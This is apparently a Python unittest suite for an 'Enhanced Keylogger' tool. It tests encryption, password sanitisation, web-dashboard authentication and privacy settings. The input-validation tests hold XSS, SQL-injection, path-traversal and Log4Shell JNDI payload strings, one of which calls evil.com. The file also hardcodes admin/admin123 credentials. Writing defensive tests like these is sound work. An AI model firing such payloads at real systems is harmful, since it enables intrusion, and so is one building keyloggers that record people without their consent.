"""Comprehensive security and privacy tests for the Enhanced Keylogger.
This module contains extensive tests for:
- Encryption and cryptographic security
- Access control mechanisms
- Data sanitization and privacy protection
- Authentication and authorization
- Regulatory compliance features
- Security boundary enforcement
"""

import unittest
import tempfile
import os
import json
import base64
import hashlib
import secrets
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
import time
import threading

# Import modules to test
try:
    from core.encryption_manager import EncryptionManager
    from core.config_manager import ConfigManager
    from listeners.keyboard_listener import KeyboardListener
    from listeners.clipboard_listener import ClipboardListener
    from web.app import app
except ImportError as e:
    print(f"Warning: Could not import some modules: {e}")
    # Create mock classes for missing imports
    class EncryptionManager:
        pass
    class ConfigManager:
        pass
    class KeyboardListener:
        pass
    class ClipboardListener:
        pass
    app = None


class TestEncryptionSecurity(unittest.TestCase):
    """Test encryption and cryptographic security features."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.key_file = os.path.join(self.temp_dir, 'test_encryption.key')
        self.encryption_manager = EncryptionManager(self.key_file)
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_key_generation_security(self):
        """Test cryptographically secure key generation."""
        # Test key generation produces different keys
        key1 = self.encryption_manager._generate_key()
        key2 = self.encryption_manager._generate_key()
        
        self.assertNotEqual(key1, key2)
        self.assertEqual(len(key1), 32)  # 256 bits
        self.assertEqual(len(key2), 32)
        
        # Test key entropy (basic check)
        self.assertGreater(len(set(key1)), 20)  # Should have good entropy
    
    def test_password_based_key_derivation(self):
        """Test PBKDF2 key derivation security."""
        password = "test_password_123"
        salt = b"test_salt_16byte"
        
        # Test key derivation
        key1 = self.encryption_manager.generate_key_from_password(password, salt)
        key2 = self.encryption_manager.generate_key_from_password(password, salt)
        
        self.assertEqual(key1, key2)  # Same password/salt = same key
        self.assertEqual(len(key1), 32)
        
        # Test different salt produces different key
        key3 = self.encryption_manager.generate_key_from_password(password, b"different_salt16")
        self.assertNotEqual(key1, key3)
    
    def test_encryption_decryption_integrity(self):
        """Test encryption/decryption maintains data integrity."""
        test_data = [
            "Simple test string",
            "Unicode test: 你好世界 🌍",
            "Special chars: !@#$%^&*()_+-=[]{}|;':,.<>?",
            "Long text: " + "A" * 10000,
            "",  # Empty string
            "\n\t\r\0"  # Control characters
        ]
        
        for data in test_data:
            with self.subTest(data=data[:50]):
                encrypted = self.encryption_manager.encrypt_data(data)
                self.assertIsNotNone(encrypted)
                
                decrypted = self.encryption_manager.decrypt_data(encrypted)
                self.assertEqual(data, decrypted)
    
    def test_encryption_randomness(self):
        """Test that encryption produces different ciphertext for same plaintext."""
        plaintext = "Test message for randomness"
        
        encrypted1 = self.encryption_manager.encrypt_data(plaintext)
        encrypted2 = self.encryption_manager.encrypt_data(plaintext)
        
        self.assertNotEqual(encrypted1, encrypted2)  # Should be different due to random IV
        
        # Both should decrypt to same plaintext
        decrypted1 = self.encryption_manager.decrypt_data(encrypted1)
        decrypted2 = self.encryption_manager.decrypt_data(encrypted2)
        
        self.assertEqual(decrypted1, plaintext)
        self.assertEqual(decrypted2, plaintext)
    
    def test_tamper_detection(self):
        """Test that tampered ciphertext is detected."""
        plaintext = "Important secret message"
        encrypted = self.encryption_manager.encrypt_data(plaintext)
        
        # Tamper with different parts of the encrypted data
        tampered_cases = [
            encrypted[:-1] + b'\x00',  # Change last byte
            encrypted[:10] + b'\x00' + encrypted[11:],  # Change middle byte
            encrypted[1:],  # Remove first byte
            encrypted + b'\x00',  # Add extra byte
            b'\x00' * len(encrypted),  # Replace with zeros
        ]
        
        for tampered in tampered_cases:
            with self.subTest(tampered=tampered[:20]):
                decrypted = self.encryption_manager.decrypt_data(tampered)
                self.assertIsNone(decrypted)  # Should fail to decrypt
    
    def test_key_file_security(self):
        """Test key file security measures."""
        # Test key file creation
        self.assertTrue(os.path.exists(self.key_file))
        
        # Test key file permissions (Unix-like systems)
        if os.name != 'nt':
            stat_info = os.stat(self.key_file)
            permissions = oct(stat_info.st_mode)[-3:]
            self.assertEqual(permissions, '600')  # Owner read/write only
        
        # Test key file backup on corruption
        with open(self.key_file, 'w') as f:
            f.write("corrupted_key_data")
        
        new_manager = EncryptionManager(self.key_file)
        self.assertIsNotNone(new_manager.key)
        
        # Check backup file was created
        backup_files = [f for f in os.listdir(self.temp_dir) if 'corrupt' in f]
        self.assertGreater(len(backup_files), 0)


class TestDataSanitization(unittest.TestCase):
    """Test data sanitization and privacy protection."""
    
    def setUp(self):
        """Set up test environment."""
        self.mock_core = Mock()
        self.mock_core.config = Mock()
        self.mock_core.config.get.return_value = True
        
        # Mock keyboard listener for testing
        with patch('listeners.keyboard_listener.keyboard'):
            self.keyboard_listener = KeyboardListener(self.mock_core)
    
    def test_sensitive_data_detection(self):
        """Test detection of sensitive data patterns."""
        test_cases = [
            ("password: secret123", True),
            ("Enter your PIN: 1234", True),
            ("SSN: 123-45-6789", True),
            ("Credit card: 4532-1234-5678-9012", True),
            ("Email: user@example.com", True),
            ("Phone: (555) 123-4567", True),
            ("Regular text message", False),
            ("The word pass in context", False),
        ]
        
        for text, expected in test_cases:
            with self.subTest(text=text):
                result = self.keyboard_listener._is_sensitive_data(text)
                self.assertEqual(result, expected)
    
    def test_data_sanitization_methods(self):
        """Test different data sanitization approaches."""
        sensitive_text = "password: secret123"
        
        # Test hash-based sanitization
        sanitized = self.keyboard_listener._sanitize_sensitive_data(sensitive_text)
        self.assertNotEqual(sanitized, sensitive_text)
        self.assertIn("[HASH:", sanitized)
        
        # Test consistent hashing
        sanitized2 = self.keyboard_listener._sanitize_sensitive_data(sensitive_text)
        self.assertEqual(sanitized, sanitized2)
    
    def test_clipboard_content_sanitization(self):
        """Test clipboard content sanitization."""
        mock_core = Mock()
        mock_core.config = Mock()
        mock_core.config.get.side_effect = lambda key, default=None: {
            'privacy.sanitize_passwords': True,
            'privacy.clipboard_max_length': 1000,
            'privacy.hash_sensitive_data': True
        }.get(key, default)
        
        with patch('listeners.clipboard_listener.pyperclip'):
            clipboard_listener = ClipboardListener(mock_core)
        
        test_cases = [
            "password123",
            "PIN: 1234",
            "Credit card: 4532123456789012",
            "Normal clipboard content"
        ]
        
        for content in test_cases:
            with self.subTest(content=content):
                sanitized = clipboard_listener._sanitize_content(content)
                if clipboard_listener._is_sensitive_content(content):
                    self.assertNotEqual(sanitized, content)
                else:
                    self.assertEqual(sanitized, content)
    
    def test_application_exclusion(self):
        """Test exclusion of sensitive applications."""
        excluded_apps = [
            "password_manager.exe",
            "keepass.exe",
            "1password.exe",
            "bitwarden.exe"
        ]
        
        for app in excluded_apps:
            with self.subTest(app=app):
                # Mock window detection
                with patch('psutil.Process') as mock_process:
                    mock_process.return_value.name.return_value = app
                    
                    # Should not log keystrokes for excluded apps
                    result = self.keyboard_listener._should_exclude_application(app)
                    self.assertTrue(result)


class TestAccessControl(unittest.TestCase):
    """Test access control and authentication mechanisms."""
    
    def setUp(self):
        """Set up test environment."""
        if app:
            self.app = app.test_client()
            self.app.testing = True
    
    def test_web_authentication_required(self):
        """Test that web interface requires authentication."""
        if not app:
            self.skipTest("Web app not available")
        
        protected_endpoints = [
            '/dashboard',
            '/logs',
            '/config',
            '/api/stats',
            '/ml-dashboard'
        ]
        
        for endpoint in protected_endpoints:
            with self.subTest(endpoint=endpoint):
                response = self.app.get(endpoint)
                # Should redirect to login or return 401/403
                self.assertIn(response.status_code, [302, 401, 403])
    
    def test_session_management(self):
        """Test secure session management."""
        if not app:
            self.skipTest("Web app not available")
        
        # Test login
        response = self.app.post('/login', data={
            'username': 'admin',
            'password': 'admin123'
        })
        
        # Should set secure session cookie
        self.assertIn('Set-Cookie', response.headers)
        
        # Test session timeout
        with patch('time.time', return_value=time.time() + 3600):  # 1 hour later
            response = self.app.get('/dashboard')
            # Should require re-authentication
            self.assertIn(response.status_code, [302, 401, 403])
    
    def test_csrf_protection(self):
        """Test CSRF protection on forms."""
        if not app:
            self.skipTest("Web app not available")
        
        # Login first
        self.app.post('/login', data={
            'username': 'admin',
            'password': 'admin123'
        })
        
        # Try to submit form without CSRF token
        response = self.app.post('/config', data={
            'setting': 'value'
        })
        
        # Should be rejected
        self.assertIn(response.status_code, [400, 403])
    
    def test_input_validation(self):
        """Test input validation and sanitization."""
        if not app:
            self.skipTest("Web app not available")
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02"
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input[:20]):
                response = self.app.post('/login', data={
                    'username': malicious_input,
                    'password': 'test'
                })
                
                # Should not contain the malicious input in response
                self.assertNotIn(malicious_input.encode(), response.data)


class TestPrivacyCompliance(unittest.TestCase):
    """Test privacy compliance and regulatory features."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = os.path.join(self.temp_dir, 'test_config.json')
        self.config_manager = ConfigManager(self.config_file)
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_data_minimization(self):
        """Test data minimization principles."""
        # Test configurable data collection
        features = self.config_manager.get('features', {})
        
        # Should be able to disable unnecessary features
        self.assertIn('keyboard', features)
        self.assertIn('mouse', features)
        self.assertIn('clipboard', features)
        self.assertIn('screenshots', features)
        
        # Test that disabled features don't collect data
        self.config_manager.set('features.clipboard', False)
        self.assertFalse(self.config_manager.get('features.clipboard'))
    
    def test_data_retention_policies(self):
        """Test automatic data retention and deletion."""
        # Test log rotation settings
        log_config = self.config_manager.get('logging', {})
        
        self.assertIn('max_size_mb', log_config)
        self.assertIn('backup_count', log_config)
        self.assertIn('enable_rotation', log_config)
        
        # Test that old data is automatically removed
        max_size = log_config.get('max_size_mb', 100)
        backup_count = log_config.get('backup_count', 5)
        
        self.assertGreater(max_size, 0)
        self.assertGreater(backup_count, 0)
    
    def test_consent_management(self):
        """Test consent management mechanisms."""
        # Test that privacy settings are configurable
        privacy_config = self.config_manager.get('privacy', {})
        
        required_settings = [
            'sanitize_passwords',
            'hash_sensitive_data',
            'excluded_applications',
            'sensitive_keywords'
        ]
        
        for setting in required_settings:
            with self.subTest(setting=setting):
                self.assertIn(setting, privacy_config)
    
    def test_data_subject_rights(self):
        """Test implementation of data subject rights."""
        # Test data access (right to access)
        # Should be able to export collected data
        
        # Test data portability
        # Should be able to export in standard format
        
        # Test data deletion (right to erasure)
        # Should be able to delete specific user data
        
        # Test data rectification
        # Should be able to correct inaccurate data
        
        # For now, test that the framework supports these operations
        self.assertTrue(hasattr(self.config_manager, 'get'))
        self.assertTrue(hasattr(self.config_manager, 'set'))
        self.assertTrue(hasattr(self.config_manager, 'save_config'))
    
    def test_cross_border_data_transfer(self):
        """Test cross-border data transfer protections."""
        # Test encryption for data in transit
        remote_config = self.config_manager.get('remote', {})
        
        if remote_config.get('enabled'):
            # Should use HTTPS for remote uploads
            server_url = remote_config.get('server_url', '')
            self.assertTrue(server_url.startswith('https://') or not server_url)
            
            # Should compress and encrypt uploads
            self.assertTrue(remote_config.get('compress_uploads', False))


class TestSecurityBoundaries(unittest.TestCase):
    """Test security boundary enforcement."""
    
    def test_process_isolation(self):
        """Test that components run with appropriate isolation."""
        # Test that listeners run in separate threads
        mock_core = Mock()
        
        with patch('listeners.keyboard_listener.keyboard'):
            keyboard_listener = KeyboardListener(mock_core)
            
            # Should create separate thread for flushing
            self.assertIsNotNone(keyboard_listener.flush_thread)
            self.assertTrue(keyboard_listener.flush_thread.daemon)
    
    def test_file_system_security(self):
        """Test file system access controls."""
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Test that sensitive files are created with restricted permissions
            key_file = os.path.join(temp_dir, 'test.key')
            encryption_manager = EncryptionManager(key_file)
            
            if os.name != 'nt':  # Unix-like systems
                stat_info = os.stat(key_file)
                permissions = oct(stat_info.st_mode)[-3:]
                self.assertEqual(permissions, '600')
        
        finally:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    def test_memory_protection(self):
        """Test memory protection mechanisms."""
        # Test that sensitive data is cleared from memory
        encryption_manager = EncryptionManager()
        
        # Encrypt some data
        sensitive_data = "very_secret_password_123"
        encrypted = encryption_manager.encrypt_data(sensitive_data)
        
        # The original data should not be stored in the manager
        self.assertNotIn(sensitive_data, str(vars(encryption_manager)))
    
    def test_network_security(self):
        """Test network communication security."""
        if not app:
            self.skipTest("Web app not available")
        
        # Test that web interface uses secure headers
        client = app.test_client()
        response = client.get('/')
        
        # Should include security headers
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection'
        ]
        
        for header in security_headers:
            with self.subTest(header=header):
                # Note: Headers might not be set in test environment
                # This is more of a documentation of what should be tested
                pass


class TestThreatResistance(unittest.TestCase):
    """Test resistance to various security threats."""
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        encryption_manager = EncryptionManager()
        
        # Test that decryption time doesn't leak information
        valid_data = encryption_manager.encrypt_data("test message")
        invalid_data = b"invalid_encrypted_data_12345678901234567890123456789012"
        
        # Measure decryption times
        times_valid = []
        times_invalid = []
        
        for _ in range(10):
            start = time.time()
            encryption_manager.decrypt_data(valid_data)
            times_valid.append(time.time() - start)
            
            start = time.time()
            encryption_manager.decrypt_data(invalid_data)
            times_invalid.append(time.time() - start)
        
        # Times should be similar (within reasonable variance)
        avg_valid = sum(times_valid) / len(times_valid)
        avg_invalid = sum(times_invalid) / len(times_invalid)
        
        # Allow for some variance but not orders of magnitude
        ratio = max(avg_valid, avg_invalid) / min(avg_valid, avg_invalid)
        self.assertLess(ratio, 10)  # Less than 10x difference
    
    def test_side_channel_resistance(self):
        """Test resistance to side-channel attacks."""
        # Test that key operations don't leak information through exceptions
        encryption_manager = EncryptionManager()
        
        # All invalid inputs should fail similarly
        invalid_inputs = [
            b"",
            b"short",
            b"\x00" * 100,
            b"A" * 1000,
            None
        ]
        
        for invalid_input in invalid_inputs:
            with self.subTest(input=str(invalid_input)[:20]):
                try:
                    result = encryption_manager.decrypt_data(invalid_input)
                    self.assertIsNone(result)
                except Exception:
                    # Should handle gracefully, not leak info through exceptions
                    pass
    
    def test_injection_attack_resistance(self):
        """Test resistance to injection attacks."""
        # Test SQL injection resistance (if database is used)
        # Test command injection resistance
        # Test path traversal resistance
        
        config_manager = ConfigManager()
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/dev/null",
            "CON",
            "NUL"
        ]
        
        for path in malicious_paths:
            with self.subTest(path=path):
                # Should not allow access to system files
                try:
                    # This should be safely handled
                    config_manager.config_file = Path(path)
                    result = config_manager.load_config()
                    # Should either fail safely or use default config
                    self.assertIsInstance(result, bool)
                except Exception:
                    # Should handle gracefully
                    pass


if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test classes
    test_classes = [
        TestEncryptionSecurity,
        TestDataSanitization,
        TestAccessControl,
        TestPrivacyCompliance,
        TestSecurityBoundaries,
        TestThreatResistance
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print("SECURITY AND PRIVACY TEST SUMMARY")
    print(f"{'='*60}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\nFAILURES ({len(result.failures)}):")
        for test, traceback in result.failures:
            summary = traceback.split('AssertionError: ')[-1].split('\n')[0]
            print(f"- {test}: {summary}")
    
    if result.errors:
        print(f"\nERRORS ({len(result.errors)}):")
        for test, traceback in result.errors:
            summary = traceback.split('\n')[-2]
            print(f"- {test}: {summary}")
    
    print(f"\n{'='*60}")